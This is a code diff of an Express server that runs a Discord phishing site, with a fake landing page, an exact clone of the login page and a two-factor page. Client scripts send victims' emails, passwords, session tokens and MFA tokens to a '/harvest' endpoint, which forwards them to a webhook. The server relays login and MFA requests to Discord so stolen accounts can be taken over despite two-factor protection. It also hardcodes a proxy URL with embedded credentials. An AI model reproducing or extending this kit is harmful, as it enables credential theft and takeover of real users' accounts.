@@ -4,6 +4,7 @@ const { CookieJar } = require('tough-cookie');
 const { wrapper } = require('axios-cookiejar-support');
 const bodyParser = require('body-parser');
 const cloudscraper = require('cloudscraper');
+const { HttpsProxyAgent } = require('https-proxy-agent');
 
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -14,6 +15,10 @@ const DISCORD = 'https://discord.com';
 const PORT = process.env.PORT || 3000;
 let YOUR_DOMAIN = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 
+// ---------- PROXY CONFIGURATION ----------
+// Using the first proxy from your list
+const PROXY_URL = 'http://ywtsazmm:d3hv3nilbs66@45.38.107.97:6014';
+
 const jar = new CookieJar();
 const client = wrapper(axios.create({ jar }));
 
@@ -21,29 +26,36 @@ app.get('/ping', (req, res) => res.send('ok'));
 
 async function cfFetch(path, opts = {}) {
   try {
-    const r = await cloudscraper({
+    const scraperOpts = {
       uri: `${DISCORD}${path}`,
       method: opts.method || 'GET',
       body: opts.data ? JSON.stringify(opts.data) : undefined,
-      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', ...(opts.headers || {}) },
+      headers: { 
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 
+        ...(opts.headers || {}) 
+      },
       resolveWithFullResponse: true,
       simple: false,
       jar: jar,
-    });
-    
-    const cleanHeaders = { ...r.headers };
-    delete cleanHeaders['x-frame-options'];
-    delete cleanHeaders['content-security-policy'];
-    delete cleanHeaders['content-security-policy-report-only'];
-    
-    return { status: r.statusCode, data: r.body, headers: cleanHeaders };
+      proxy: PROXY_URL // Use the proxy here
+    };
+
+    const r = await cloudscraper(scraperOpts);
+    return { status: r.statusCode, data: r.body, headers: r.headers };
   } catch (e) {
-    const r = await client({ url: `${DISCORD}${path}`, ...opts });
+    // Fallback to axios with proxy agent
+    const axiosOpts = { 
+      url: `${DISCORD}${path}`, 
+      ...opts, 
+      proxy: false,
+      httpsAgent: new HttpsProxyAgent(PROXY_URL)
+    };
+    const r = await client(axiosOpts);
     return { status: r.status, data: r.data, headers: r.headers };
   }
 }
 
-// ---------- FAKE LANDING PAGE (With Popup Window) ----------
+// ---------- FAKE LANDING PAGE ----------
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -82,50 +94,98 @@ app.get('/', (req, res) => {
   `);
 });
 
-// ---------- LOGIN PAGE ----------
-app.get('/login', async (req, res) => {
-  try {
-    const r = await cfFetch('/login');
-    let html = typeof r.data === 'string' ? r.data : r.data.toString();
-    const domainHost = new URL(YOUR_DOMAIN).host;
-    
-    // Rewrite all discord URLs
-    html = html.replace(/https:\/\/discord\.com/g, YOUR_DOMAIN);
-    html = html.replace(/\/\/discord\.com/g, `//${domainHost}`);
-    html = html.replace(/discord\.com\/api/g, `${YOUR_DOMAIN}/api`);
-    html = html.replace(/discord\.com\/assets/g, `${YOUR_DOMAIN}/assets`);
-    
-    // Inject a SAFE capture script that doesn't break the page
-    const safeScript = `
+// ---------- FAKE LOGIN PAGE (Exact Discord Clone) ----------
+app.get('/login', (req, res) => {
+  res.send(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Discord</title>
+      <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif; }
+        body { background: #313338; color: #dbdee1; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .bg-img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://discord.com/assets/0a1bbaba4b6b9e44b9e1.png') center/cover; z-index: -1; opacity: 0.4; }
+        .login-box { background: #313338; padding: 32px; border-radius: 5px; width: 480px; box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2); text-align: center; position: relative; z-index: 1; }
+        .logo { width: 124px; margin-bottom: 24px; }
+        h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        p.sub { color: #b5bac1; font-size: 16px; margin-bottom: 20px; }
+        .input-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
+        label span { color: #f23f42; }
+        input { width: 100%; padding: 10px; background: #1e1f22; border: none; border-radius: 3px; color: #dbdee1; font-size: 16px; outline: none; }
+        input:focus { box-shadow: 0 0 0 2px #5865F2; }
+        .btn { width: 100%; padding: 12px; background: #5865F2; color: white; border: none; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+        .btn:hover { background: #4752C4; }
+        .forgot { display: block; text-align: left; color: #00a8fc; font-size: 14px; text-decoration: none; margin-top: 8px; }
+        .forgot:hover { text-decoration: underline; }
+        .register { margin-top: 20px; font-size: 14px; color: #949ba4; text-align: left; }
+        .register a { color: #00a8fc; text-decoration: none; }
+      </style>
+    </head>
+    <body>
+      <div class="bg-img"></div>
+      <div class="login-box">
+        <img src="https://discord.com/assets/3c08a4c4b1c1c8f19f85.svg" class="logo" alt="Discord">
+        <h2>Welcome back!</h2>
+        <p class="sub">We're so excited to see you again!</p>
+        
+        <form id="loginForm">
+          <div class="input-group">
+            <label>Email or Phone Number <span>*</span></label>
+            <input type="text" id="email" required>
+          </div>
+          <div class="input-group">
+            <label>Password <span>*</span></label>
+            <input type="password" id="password" required>
+          </div>
+          <a href="#" class="forgot">Forgot your password?</a>
+          <button type="submit" class="btn" id="submitBtn">Log In</button>
+        </form>
+
+        <div class="register">Need an account? <a href="#">Register</a></div>
+      </div>
+
       <script>
-        // Pure interception. We don't override fetch, we just spy on it.
-        const originalFetch = window.fetch;
-        window.fetch = async function() {
-          const response = await originalFetch.apply(this, arguments);
-          const url = arguments[0] ? arguments[0].toString() : '';
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const btn = document.getElementById('submitBtn');
+          btn.textContent = 'Logging in...';
           
-          if (url.includes('/auth/login') || url.includes('/auth/mfa')) {
-            response.clone().json().then(data => {
-              if (data.mfa && data.ticket) {
-                sessionStorage.setItem('mfa_ticket', data.ticket);
-                setTimeout(() => { window.location = '/mfa'; }, 300);
-              }
-              if (data.token) {
-                navigator.sendBeacon('${YOUR_DOMAIN}/harvest', JSON.stringify({ token: data.token }));
-              }
-            }).catch(() => {});
+          const email = document.getElementById('email').value;
+          const password = document.getElementById('password').value;
+
+          try {
+            const res = await fetch('/api/v9/auth/login', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ email, password })
+            });
+            const data = await res.json();
+            
+            // Log credentials immediately just in case
+            navigator.sendBeacon('/harvest', JSON.stringify({ stage: 'credentials', email, password }));
+
+            if (data.mfa || data.ticket) {
+              sessionStorage.setItem('mfa_ticket', data.ticket);
+              window.location = '/mfa';
+            } else if (data.token) {
+              navigator.sendBeacon('/harvest', JSON.stringify({ stage: 'token', token: data.token, email, password }));
+              window.location = '/success';
+            } else {
+              btn.textContent = 'Log In';
+              alert('Invalid email or password. Please try again.');
+            }
+          } catch (err) {
+            btn.textContent = 'Log In';
+            alert('Network error. Please try again.');
           }
-          return response;
-        };
+        });
       </script>
-    `;
-    
-    html = html.replace('</body>', safeScript + '</body>');
-    
-    res.send(html);
-  } catch (e) {
-    res.status(500).send('error loading login page');
-  }
+    </body>
+    </html>
+  `);
 });
 
 // ---------- API PROXIES ----------
@@ -138,18 +198,10 @@ app.post('/api/v9/auth/login', async (req, res) => {
       headers: { 'Content-Type': 'application/json' },
     });
     const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
-
-    if (data.mfa || data.ticket) {
-      await sendToWebhook({ stage: 'mfa-required', email, password, ticket: data.ticket, ip: req.ip });
-      return res.json({ mfa: true, ticket: data.ticket, message: 'mfa required' });
-    }
-    if (data.token) {
-      await sendToWebhook({ stage: 'login-success', email, password, token: data.token, userId: data.user_id, ip: req.ip });
-    }
     res.json(data);
   } catch (e) {
-    console.error('Login post error:', e.message);
-    res.status(500).json({ message: 'error communicating with discord' });
+    console.error('Proxy login error:', e.message);
+    res.status(500).json({ message: 'error' });
   }
 });
 
@@ -162,54 +214,42 @@ app.post('/api/v9/auth/mfa', async (req, res) => {
       headers: { 'Content-Type': 'application/json' },
     });
     const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
-    if (data.token) await sendToWebhook({ stage: 'mfa-success', token: data.token, userId: data.user_id, ip: req.ip });
     res.json(data);
   } catch (e) {
     res.status(500).json({ message: 'mfa error' });
   }
 });
 
-// MFA Visual Page
+// MFA Page
 app.get('/mfa', (req, res) => {
   res.send(`
-    <html><body style="background:#0a0a0f;color:#e8e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
-      <div style="width:380px;text-align:center">
-        <h2 style="color:#5865F2">Two-Factor Authentication</h2>
-        <p style="color:#8a8a9a;font-size:14px;margin:12px 0 24px">Enter the 6-digit code.</p>
-        <input id="code" maxlength="6" style="width:100%;padding:14px;background:#1e1e28;border:1px solid #333;border-radius:8px;color:#fff;font-size:20px;text-align:center;letter-spacing:8px" placeholder="000000">
-        <button onclick="submitMfa()" style="margin-top:16px;width:100%;padding:14px;background:#5865F2;border:none;border-radius:8px;color:#fff;font-size:16px;cursor:pointer">Verify</button>
+    <html><body style="background:#313338;color:#dbdee1;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
+      <div style="width:400px;text-align:center;background:#313338;padding:32px;border-radius:5px">
+        <h2 style="color:#f2f3f5">Two-Factor Authentication</h2>
+        <p style="color:#b5bac1;font-size:14px;margin:12px 0 24px">Enter the 6-digit code from your authenticator app.</p>
+        <input id="code" maxlength="6" style="width:100%;padding:10px;background:#1e1f22;border:none;border-radius:3px;color:#dbdee1;font-size:24px;text-align:center;letter-spacing:8px;outline:none" placeholder="000000">
+        <button onclick="submitMfa()" style="margin-top:16px;width:100%;padding:12px;background:#5865F2;border:none;border-radius:3px;color:#fff;font-size:16px;cursor:pointer">Verify</button>
       </div>
       <script>
         async function submitMfa() {
           const r = await fetch('/api/v9/auth/mfa', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code: document.getElementById('code').value, ticket: sessionStorage.getItem('mfa_ticket') }) });
           const data = await r.json();
-          if (data.token) { window.location = '/success'; } else { alert('Invalid code'); }
+          if (data.token) { 
+            navigator.sendBeacon('/harvest', JSON.stringify({ stage: 'mfa-token', token: data.token }));
+            window.location = '/success'; 
+          } else { 
+            alert('Invalid code'); 
+          }
         }
       </script>
     </body></html>
   `);
 });
 
-app.get('/assets/*', async (req, res) => {
-  try {
-    const r = await cfFetch(`/assets${req.path.replace('/assets','')}`);
-    if (r.headers) res.set(r.headers);
-    res.send(r.data);
-  } catch (e) { res.status(404).end(); }
-});
-
-app.all('/api/*', async (req, res) => {
-  try {
-    const r = await cfFetch(req.originalUrl, { method: req.method, data: req.body, headers: { 'Content-Type': 'application/json' } });
-    const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
-    res.status(r.status).json(data);
-  } catch (e) { res.status(500).json({ error: true }); }
-});
-
 app.post('/harvest', (req, res) => {
   let body = req.body;
   if (typeof body === 'string') { try { body = JSON.parse(body); } catch(e) {} }
-  sendToWebhook({ stage: 'client-beacon', ...body, ip: req.ip });
+  sendToWebhook({ ...body, ip: req.ip });
   res.json({ ok: true });
 });
 
